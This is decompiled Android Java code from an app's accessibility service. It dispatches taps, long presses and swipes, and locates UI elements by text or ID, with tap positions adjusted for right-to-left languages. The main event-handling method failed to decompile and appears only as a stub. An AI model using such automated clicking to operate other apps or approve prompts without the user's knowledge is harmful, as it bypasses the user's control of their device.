package defpackage;

import android.accessibilityservice.GestureDescription;
import android.content.res.Resources;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.TypedValue;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.mamimobi.AccessService;
import java.util.LinkedList;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

/* JADX INFO: loaded from: classes.dex */
public abstract class d91 {
    public static k1 f;
    public static AccessibilityEvent g;
    public static final AtomicBoolean a = new AtomicBoolean(false);
    public static int b = 32;
    public static final AtomicBoolean c = new AtomicBoolean(false);
    public static final AtomicBoolean d = new AtomicBoolean(false);
    public static final Handler e = new Handler(Looper.getMainLooper());
    public static long h = 0;

    public static boolean a(AccessService accessService, float f2, float f3) {
        DisplayMetrics displayMetrics = new DisplayMetrics();
        ((WindowManager) accessService.getSystemService("window")).getDefaultDisplay().getRealMetrics(displayMetrics);
        int i = displayMetrics.widthPixels;
        int i2 = displayMetrics.heightPixels;
        if (f2 <= 0.0f || f2 > i || f3 <= 0.0f || f3 > i2 || !a.compareAndSet(false, true)) {
            return false;
        }
        GestureDescription.Builder builder = new GestureDescription.Builder();
        Path path = new Path();
        path.moveTo(f2, f3);
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L));
        new Handler(Looper.getMainLooper()).postDelayed(new l1(23), 500L);
        accessService.dispatchGesture(builder.build(), new vm0(3), null);
        return true;
    }

    public static boolean b(AccessService accessService, float f2, float f3) {
        DisplayMetrics displayMetrics = new DisplayMetrics();
        ((WindowManager) accessService.getSystemService("window")).getDefaultDisplay().getRealMetrics(displayMetrics);
        int i = displayMetrics.widthPixels;
        int i2 = displayMetrics.heightPixels;
        if (f2 <= 0.0f || f2 > i || f3 <= 0.0f || f3 > i2) {
            return false;
        }
        GestureDescription.Builder builder = new GestureDescription.Builder();
        Path path = new Path();
        path.moveTo(f2, f3);
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L));
        new Handler(Looper.getMainLooper()).postDelayed(new l1(22), 500L);
        accessService.dispatchGesture(builder.build(), new vm0(4), null);
        return true;
    }

    public static float c(float f2) {
        return TypedValue.applyDimension(1, f2, Resources.getSystem().getDisplayMetrics());
    }

    public static AccessibilityNodeInfo d(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId;
        if (accessibilityNodeInfo == null || (listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str)) == null || listFindAccessibilityNodeInfosByViewId.isEmpty()) {
            return null;
        }
        return listFindAccessibilityNodeInfosByViewId.get(0);
    }

    public static AccessibilityNodeInfo e(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        LinkedList linkedList = new LinkedList();
        linkedList.add(accessibilityNodeInfo);
        while (!linkedList.isEmpty()) {
            AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) linkedList.poll();
            if (accessibilityNodeInfo2 != null) {
                CharSequence text = accessibilityNodeInfo2.getText();
                if (text != null && text.toString().toLowerCase().equals(str.toLowerCase())) {
                    return accessibilityNodeInfo2;
                }
                for (int i = 0; i < accessibilityNodeInfo2.getChildCount(); i++) {
                    linkedList.add(accessibilityNodeInfo2.getChild(i));
                }
            }
        }
        return null;
    }

    public static int f(Rect rect) {
        String language = Locale.getDefault().getLanguage();
        return (language.equals("ur") || language.equals("fa") || language.equals("he") || language.equals("iw") || language.equals("syc") || language.equals("ps") || language.equals("bal") || language.equals("sd") || language.equals("prs") || language.equals("ar")) ? (rect.left + rect.right) / 4 : ((rect.left + rect.right) * 3) / 4;
    }

    public static int g(Rect rect) {
        String language = Locale.getDefault().getLanguage();
        return (language.equals("ur") || language.equals("fa") || language.equals("he") || language.equals("iw") || language.equals("syc") || language.equals("ps") || language.equals("bal") || language.equals("sd") || language.equals("prs") || language.equals("ar")) ? (rect.left + rect.right) / 4 : (int) (((double) (rect.left + rect.right)) * 0.8333333333333334d);
    }

    /* JADX WARN: Removed duplicated region for block: B:123:0x0296  */
    /* JADX WARN: Removed duplicated region for block: B:227:0x0512 A[Catch: Exception -> 0x0af0, TRY_LEAVE, TryCatch #0 {Exception -> 0x0af0, blocks: (B:3:0x0004, B:5:0x0012, B:7:0x0018, B:9:0x0020, B:11:0x002a, B:13:0x0032, B:14:0x0035, B:16:0x003f, B:17:0x0043, B:19:0x0049, B:21:0x0051, B:24:0x0058, B:32:0x0067, B:35:0x0081, B:37:0x0087, B:39:0x0097, B:71:0x0170, B:73:0x0176, B:75:0x0184, B:80:0x0195, B:83:0x01a5, B:85:0x01af, B:87:0x01b5, B:89:0x01bb, B:91:0x01c1, B:93:0x01cb, B:95:0x01d1, B:97:0x01d7, B:99:0x01e6, B:101:0x0203, B:103:0x021c, B:105:0x0222, B:107:0x023d, B:109:0x0245, B:111:0x024b, B:113:0x0253, B:115:0x0259, B:117:0x025f, B:119:0x0265, B:121:0x026b, B:125:0x029a, B:127:0x02a0, B:129:0x02aa, B:131:0x02b6, B:133:0x02c2, B:135:0x02ce, B:137:0x02da, B:139:0x02e6, B:141:0x02f2, B:143:0x02fe, B:145:0x030a, B:147:0x0316, B:149:0x0322, B:151:0x032e, B:153:0x033a, B:155:0x0346, B:157:0x0352, B:159:0x035e, B:161:0x036a, B:163:0x0376, B:165:0x0382, B:167:0x038e, B:169:0x039a, B:171:0x03a6, B:173:0x03b2, B:175:0x03be, B:177:0x03ca, B:179:0x03d6, B:181:0x03e2, B:183:0x03ee, B:185:0x03fa, B:187:0x0406, B:189:0x0412, B:191:0x041e, B:193:0x043a, B:194:0x043f, B:196:0x045c, B:198:0x0468, B:200:0x0474, B:202:0x0480, B:204:0x048c, B:206:0x0498, B:209:0x04a5, B:211:0x04ab, B:213:0x04bf, B:215:0x04cf, B:217:0x04e1, B:218:0x04ed, B:220:0x04f8, B:222:0x0500, B:224:0x0508, B:227:0x0512, B:230:0x0526, B:232:0x052e, B:234:0x0536, B:236:0x053c, B:238:0x0544, B:239:0x054a, B:241:0x0552, B:243:0x0558, B:245:0x0560, B:248:0x056a, B:250:0x0570, B:252:0x0576, B:254:0x058c, B:257:0x0594, B:259:0x05a4, B:261:0x05ac, B:263:0x05b4, B:265:0x05bc, B:267:0x05c4, B:269:0x05cc, B:271:0x05d4, B:273:0x05dc, B:275:0x05e4, B:277:0x05ec, B:279:0x05f4, B:281:0x05fc, B:283:0x0604, B:285:0x060c, B:287:0x0614, B:289:0x061c, B:291:0x0624, B:293:0x062c, B:295:0x0634, B:297:0x063c, B:299:0x0644, B:301:0x064c, B:303:0x0652, B:304:0x0668, B:306:0x0678, B:308:0x0680, B:310:0x0688, B:312:0x0690, B:314:0x0698, B:316:0x069e, B:317:0x06a4, B:319:0x06ac, B:321:0x06b2, B:324:0x06bc, B:326:0x06c2, B:328:0x06c8, B:330:0x06e0, B:333:0x06ea, B:335:0x06f2, B:337:0x0719, B:339:0x071f, B:341:0x0727, B:343:0x072f, B:344:0x0733, B:346:0x073b, B:349:0x0743, B:351:0x0749, B:353:0x074f, B:356:0x0767, B:358:0x076f, B:361:0x077f, B:363:0x07a1, B:365:0x07a7, B:366:0x07ae, B:367:0x07d6, B:369:0x07de, B:371:0x07e6, B:373:0x07ee, B:375:0x07f6, B:377:0x07fe, B:379:0x0806, B:381:0x080e, B:383:0x0816, B:385:0x081e, B:387:0x0826, B:389:0x082c, B:391:0x0832, B:393:0x0838, B:395:0x084c, B:397:0x0867, B:400:0x0884, B:402:0x088a, B:404:0x089a, B:407:0x08a4, B:409:0x08ac, B:411:0x08b2, B:414:0x08ba, B:417:0x08ca, B:420:0x08e1, B:422:0x08e7, B:424:0x08ed, B:426:0x08f3, B:428:0x0919, B:431:0x0930, B:433:0x0936, B:436:0x093e, B:439:0x094e, B:441:0x0954, B:443:0x095a, B:445:0x0960, B:447:0x0974, B:449:0x099b, B:451:0x09bc, B:453:0x09c6, B:455:0x09cf, B:457:0x09df, B:459:0x09e7, B:461:0x09ef, B:463:0x09f7, B:464:0x09fb, B:466:0x0a03, B:469:0x0a0b, B:471:0x0a11, B:473:0x0a17, B:475:0x0a2d, B:478:0x0a38, B:480:0x0a40, B:482:0x0a48, B:484:0x0a50, B:486:0x0a58, B:488:0x0a60, B:490:0x0a68, B:492:0x0a8e, B:494:0x0a96, B:496:0x0a9e, B:498:0x0aa6, B:500:0x0aac, B:502:0x0ab2, B:505:0x0ac2, B:507:0x0aca, B:41:0x00a3, B:43:0x00a9, B:45:0x00b7, B:47:0x00bd, B:50:0x00c5, B:53:0x00d5, B:56:0x00ec, B:58:0x00f2, B:60:0x00f8, B:62:0x00fc, B:64:0x0118, B:66:0x0142), top: B:512:0x0004 }] */
    /* JADX WARN: Removed duplicated region for block: B:586:0x050e A[SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static void h(final com.mamimobi.AccessService r22, android.view.accessibility.AccessibilityEvent r23) {
        /*
            Method dump skipped, instruction units count: 2805
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: defpackage.d91.h(com.mamimobi.AccessService, android.view.accessibility.AccessibilityEvent):void");
    }

    public static void i(AccessService accessService, AccessibilityEvent accessibilityEvent) {
        int eventType = accessibilityEvent.getEventType();
        if (eventType == 32 || eventType == 2048 || eventType == 4194304) {
            Handler handler = e;
            if (eventType != 2048) {
                handler.post(new t1(accessService, accessibilityEvent, 2));
                return;
            }
            long jCurrentTimeMillis = System.currentTimeMillis();
            if (jCurrentTimeMillis - h < 300) {
                return;
            }
            h = jCurrentTimeMillis;
            g = AccessibilityEvent.obtain(accessibilityEvent);
            k1 k1Var = f;
            if (k1Var != null) {
                handler.removeCallbacks(k1Var);
            }
            k1 k1Var2 = new k1(accessService, 12);
            f = k1Var2;
            handler.postDelayed(k1Var2, 200L);
        }
    }

    public static void j(AccessService accessService, float f2, float f3) {
        GestureDescription.Builder builder = new GestureDescription.Builder();
        Path path = new Path();
        path.moveTo(f2, f3);
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, 700L));
        accessService.dispatchGesture(builder.build(), null, null);
    }

    public static void k(AccessService accessService, float f2, float f3, float f4, float f5) {
        try {
            GestureDescription.Builder builder = new GestureDescription.Builder();
            Path path = new Path();
            path.moveTo(f2, f3);
            path.lineTo(f4, f5);
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, 600L));
            accessService.dispatchGesture(builder.build(), null, null);
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }
}
